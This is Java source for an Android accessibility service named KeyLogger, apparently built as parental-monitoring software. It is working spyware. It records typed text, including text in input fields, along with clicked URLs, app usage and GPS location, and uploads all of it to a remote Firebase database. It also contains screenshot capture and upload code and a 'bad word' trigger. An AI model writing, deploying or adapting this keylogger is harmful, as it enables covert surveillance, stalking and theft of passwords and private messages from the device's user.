package com.maemresen.infsec.keylogapp;

import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.ImageFormat;
import android.graphics.Matrix;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.maemresen.infsec.keylogapp.model.KeyLog;
import com.maemresen.infsec.keylogapp.util.DateTimeHelper;
import com.maemresen.infsec.keylogapp.util.Helper;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyLogger extends AccessibilityService implements LocationListener {
    
    private final static String LOG_TAG = Helper.getLogTag( KeyLogger.class );
    private BadWordDetector badWordDetector;
    private FirebaseStorage firebaseStorage;
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private Intent data;
    private String ownerName;
    private String databaseName;
    private LocationManager locationManager;
    private Location lastLocation;
    private DatabaseReference locationRef;
    private long lastLocationUpdateTime = 0;
    
    
    private static final long MIN_TIME_BETWEEN_UPDATES = 15 * 1000;
    private static final float MIN_DISTANCE_CHANGE_FOR_UPDATES = 0.1f;
    
    public void onServiceConnected() {
        Log.i( LOG_TAG, "Starting service" );
        badWordDetector = new BadWordDetector();
        firebaseStorage = FirebaseStorage.getInstance();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjectionManager = (MediaProjectionManager) getSystemService( Context.MEDIA_PROJECTION_SERVICE );
        }
        WindowManager windowManager = (WindowManager) getSystemService( Context.WINDOW_SERVICE );
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics( metrics );
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
        imageReader = ImageReader.newInstance( screenWidth, screenHeight, ImageFormat.JPEG, 2 );
        
        ownerName = Build.MODEL;
        
        SimpleDateFormat dateFormat = new SimpleDateFormat( "dd-MM-yyyy", Locale.getDefault() );
        Date now = DateTimeHelper.getCurrentDay();
        databaseName = dateFormat.format( now ); // Assign the value to the class-level variable
        
        // Initialize LocationManager and start location updates
        locationManager = (LocationManager) getSystemService( Context.LOCATION_SERVICE );
        startLocationUpdates();
    }
    
    Date now = DateTimeHelper.getCurrentDay();
    SimpleDateFormat dateFormatWithTime = new SimpleDateFormat( "dd-MM-yyyy, HH:mm",
            Locale.getDefault() );
    String databaseNameWithTime = dateFormatWithTime.format( now );
    
    SimpleDateFormat dateFormatWithTimeseconds = new SimpleDateFormat( "dd-MM-yyyy, HH:mm:ss",
            Locale.getDefault() );
    String dateFormatWithTimeSeconds = dateFormatWithTimeseconds.format( now );
    
    @Override
    public void onAccessibilityEvent( AccessibilityEvent event ) {
        // so this project completely depends on accessibility Events of the phone
        //please refer this website https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent
        
        String uuid = Helper.getUuid();
        Date now = DateTimeHelper.getCurrentDay();
        String accessibilityEvent = null;
        String msg = null;

    /*
    AccessibilityEvent.TYPE_VIEW_CLICKED: Triggered when a view is clicked.
    AccessibilityEvent.TYPE_VIEW_LONG_CLICKED: Triggered when a view is long-clicked.
    AccessibilityEvent.TYPE_VIEW_SELECTED: Triggered when a view is selected.
    AccessibilityEvent.TYPE_VIEW_FOCUSED: Triggered when a view receives focus.
    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: Triggered when the text content of a view changes.
    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: Triggered when the state of a window changes.
    AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: Triggered when the state of a notification changes.
    AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START: Triggered when a touch exploration gesture starts.
    AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END: Triggered when a touch exploration gesture ends.
    AccessibilityEvent.TYPE_VIEW_HOVER_ENTER: Triggered when a view is being hovered over.
    * */
        
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "Text Changed";
                msg = String.valueOf( event.getText() );
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "View Focused";
                msg = String.valueOf( event.getText() );
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "View Clicked";
                msg = String.valueOf( event.getText() );
                
                if (Helper.isURL( msg )) {
                    DatabaseReference urlData = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                            .child( ownerName )
                            .child( databaseName )
                            .child( "URL Visits" );
                    urlData.push().setValue( msg );
                }
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED: {
                accessibilityEvent = "Long Clicked";
                msg = String.valueOf( event.getText() );
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_SELECTED: {
                accessibilityEvent = "View Selected";
                msg = String.valueOf( event.getText() );
                break;
            }
            default:
        }
        
        if (accessibilityEvent == null) {
            return;
        }
        
        Log.i( LOG_TAG, msg );
        
        String packageName = event.getPackageName().toString();
        String ownerName = Build.MODEL;
        
        KeyLog keyLog = new KeyLog();
        keyLog.setUuid( uuid );
        keyLog.setKeyLogDate( now );
        keyLog.setAccessibilityEvent( accessibilityEvent );
        keyLog.setMsg( msg );
        
        // Check if it's a keyboard click event
        CharSequence classNameCs = event.getClassName();
        String className = classNameCs.toString();
        if (className.contains( "EditText" ) || className.contains( "Input" )) {
            DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "Text Records" );
            logdata.push().setValue( "Text: " + msg + "\n" +
                    "DateTime: " + dateFormatWithTimeSeconds + "\n\n" +
                    "App: " + packageName );
            
        } else if (!TextUtils.isEmpty(msg)) {
            DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "All Records" );
            
            logdata.push().setValue( "Usage: " + msg + "\n" +
                    "DateTime: " + dateFormatWithTimeSeconds + "\n" +
                    "Accessibility Event: " + accessibilityEvent + "\n\n" +
                    "App: " + packageName );
        }
        
        // Check if any bad word is typed by the user and perform screen shot operation event
        if (badWordDetector.containsBadWord( msg )) {
            
            //creating a new folder in the database
            DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                    .child( ownerName )
                    .child( databaseName )
                    .child( "Bad Word Usage" );
            
            logdata.push().setValue( "Usage: " + msg + "\n" +
                    "Date/Time: " + databaseNameWithTime + "\n\n" +
                    "App: " + packageName );
            
            //now the screen shot part
//            captureScreenShot();
        }
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED && event.getPackageName() != null) {
            saveDataToFirebase( event.getPackageName().toString(), System.currentTimeMillis() );
        }
        
    }
    
    
    //***********************************************************************LOCATION START
    private void startLocationUpdates() {
        // Check for location provider availability and request location updates
        if (locationManager != null) {
            if (locationManager.isProviderEnabled( LocationManager.GPS_PROVIDER )) {
                if (ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
                        && ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER,
                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
                    Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
                    if (lastKnownLocation != null) {
                        double latitude = lastKnownLocation.getLatitude();
                        double longitude = lastKnownLocation.getLongitude();
                        saveLocationToFirebase( latitude, longitude );
                    }
                } else {
                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using GPS" );
                }
            } else if (locationManager.isProviderEnabled( LocationManager.NETWORK_PROVIDER )) {
                if (ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
                        && ActivityCompat.checkSelfPermission( this,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
                    locationManager.requestLocationUpdates( LocationManager.NETWORK_PROVIDER,
                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
                } else {
                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using NETWORK" );
                }
            }
        }
    }
    
    
    public void onLocationChanged( Location location ) {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastLocationUpdateTime >= MIN_TIME_BETWEEN_UPDATES || location.distanceTo( lastLocation ) >= MIN_DISTANCE_CHANGE_FOR_UPDATES) {
            saveLocationToFirebase( location.getLatitude(), location.getLongitude() );
            lastLocationUpdateTime = currentTime;
            lastLocation = location;
        }
    }
    
    @Override
    public void onProviderDisabled( String provider ) {
    }
    
    @Override
    public void onProviderEnabled( String provider ) {
        if (ActivityCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_FINE_LOCATION ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_COARSE_LOCATION ) != PackageManager.PERMISSION_GRANTED) {
            saveLocationErrorToFirebase( "Sorry The Phone GPS Location is not Enabled" );
            return;
        }
        Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
        if (lastKnownLocation != null) {
            double latitude = lastKnownLocation.getLatitude();
            double longitude = lastKnownLocation.getLongitude();
            saveLocationToFirebase( latitude, longitude );
        } else {
            saveLocationErrorToFirebase( "Unable to retrieve location from the User" );
        }
    }
    
    @Override
    public void onStatusChanged( String provider, int status, Bundle extras ) {
    }
    
    
    private void saveLocationToFirebase( double latitude, double longitude ) {
        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
                        " User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        String locationText = String.format( Locale.getDefault(), "LOCATION: %.6f lat, %.6f " +
                "lon\nDate/Time: %s", latitude, longitude, dateFormatWithTimeSeconds );
        locationRefrence.push().setValue( locationText );
        
    }
    
    private void saveLocationErrorToFirebase( String errMsg ) {
        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
                        " User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Location" );
        
        String locationText = String.format( Locale.getDefault(), "LOCATION: %s \nDate/Time: %s", errMsg, dateFormatWithTimeSeconds );
        locationRefrence.push().setValue( locationText );
    }
    
    //***********************************************************************LOCATION END
    private void saveDataToFirebase( String packageName, long timestamp ) {
        DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                .child( ownerName )
                .child( databaseName )
                .child( "Phone Usage Time" );
        logdata.child( packageName ).setValue( timestamp );
    }
    
    private void captureScreenShot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjection = mediaProjectionManager.getMediaProjection( Activity.RESULT_OK, data );
            if (mediaProjection == null) {
                Log.e( "MG", "mediaProjection has been null so image is not taken" );
                return;
            }
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null,
                    null
            );
        }
        
        imageReader.setOnImageAvailableListener( reader -> {
            Image image = reader.acquireLatestImage();
            if (image != null) {
                Bitmap screenshotBitmap = convertImageToBitmap( image );
                image.close();
                
                if (screenshotBitmap != null) {
                    // Save the screenshot to a file
                    File screenshotFile = saveScreenshotToFile( screenshotBitmap );
                    
                    if (screenshotFile != null) {
                        saveImageToGallery( screenshotFile );
                        // Upload the screenshot to Firebase Storage
                        uploadScreenshotToFirebase( screenshotFile );
                    }
                }
            }
        }, null );
    }
    
    private void saveImageToGallery( File imageFile ) {
        ContentValues values = new ContentValues();
        values.put( MediaStore.Images.Media.TITLE, "Screenshot" );
        values.put( MediaStore.Images.Media.DISPLAY_NAME, "Screenshot" );
        values.put( MediaStore.Images.Media.DESCRIPTION, "Screenshot" );
        values.put( MediaStore.Images.Media.MIME_TYPE, "image/png" );
        values.put( MediaStore.Images.Media.DATE_ADDED, System.currentTimeMillis() / 1000 );
        values.put( MediaStore.Images.Media.DATA, imageFile.getAbsolutePath() );
        
        ContentResolver contentResolver = getContentResolver();
        Uri uri = contentResolver.insert( MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values );
        
        // You can show a toast message or perform any other action here to indicate that the image was saved to the gallery
    }
    
    private Bitmap convertImageToBitmap( Image image ) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[ 0 ].getBuffer();
        int width = image.getWidth();
        int height = image.getHeight();
        int pixelStride = planes[ 0 ].getPixelStride();
        int rowStride = planes[ 0 ].getRowStride();
        int rowPadding = rowStride - pixelStride * width;
        Bitmap bitmap = Bitmap.createBitmap( width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888 );
        bitmap.copyPixelsFromBuffer( buffer );
        Matrix matrix = new Matrix();
        matrix.postRotate( 90 );
        return Bitmap.createBitmap( bitmap, 0, 0, width, height, matrix, true );
    }
    
    private File saveScreenshotToFile( Bitmap screenshotBitmap ) {
        File screenshotDir = getExternalFilesDir( Environment.DIRECTORY_PICTURES );
        String screenshotFileName = "screenshot_" + System.currentTimeMillis() + ".png";
        File screenshotFile = new File( screenshotDir, screenshotFileName );
        
        try {
            FileOutputStream fos = new FileOutputStream( screenshotFile );
            screenshotBitmap.compress( Bitmap.CompressFormat.PNG, 100, fos );
            fos.flush();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        
        return screenshotFile;
    }
    
    private void uploadScreenshotToFirebase( File screenshotFile ) {
        // Create a unique filename for the screenshot
        String filename = "screenshot_" + System.currentTimeMillis() + ".jpg";
        
        // Create a Firebase Storage reference for the screenshot
        StorageReference storageRef = firebaseStorage.getReference().child( "screenshots" ).child( filename );
        
        // Upload the screenshot file to Firebase Storage
        Uri fileUri = Uri.fromFile( screenshotFile );
        UploadTask uploadTask = storageRef.putFile( fileUri );
        
        uploadTask.addOnSuccessListener( taskSnapshot -> {
            // The screenshot was uploaded successfully
            Log.i( LOG_TAG, "Screenshot uploaded successfully" );
            
            // Retrieve the download URL for the screenshot
            storageRef.getDownloadUrl().addOnSuccessListener( downloadUri -> {
                // The download URL can be stored in Firebase Database or sent to the father's phone
                String screenshotUrl = downloadUri.toString();
                Log.i( LOG_TAG, "Screenshot URL: " + screenshotUrl );
                // Process the screenshot URL as needed
            } ).addOnFailureListener( exception -> {
                // Failed to retrieve the download URL
                Log.e( LOG_TAG, "Failed to retrieve screenshot download URL", exception );
            } );
        } ).addOnFailureListener( exception -> {
            // Failed to upload the screenshot
            Log.e( LOG_TAG, "Failed to upload screenshot to Firebase Storage", exception );
        } );
    }
    
    @Override
    public void onInterrupt() {
    
    }
    
}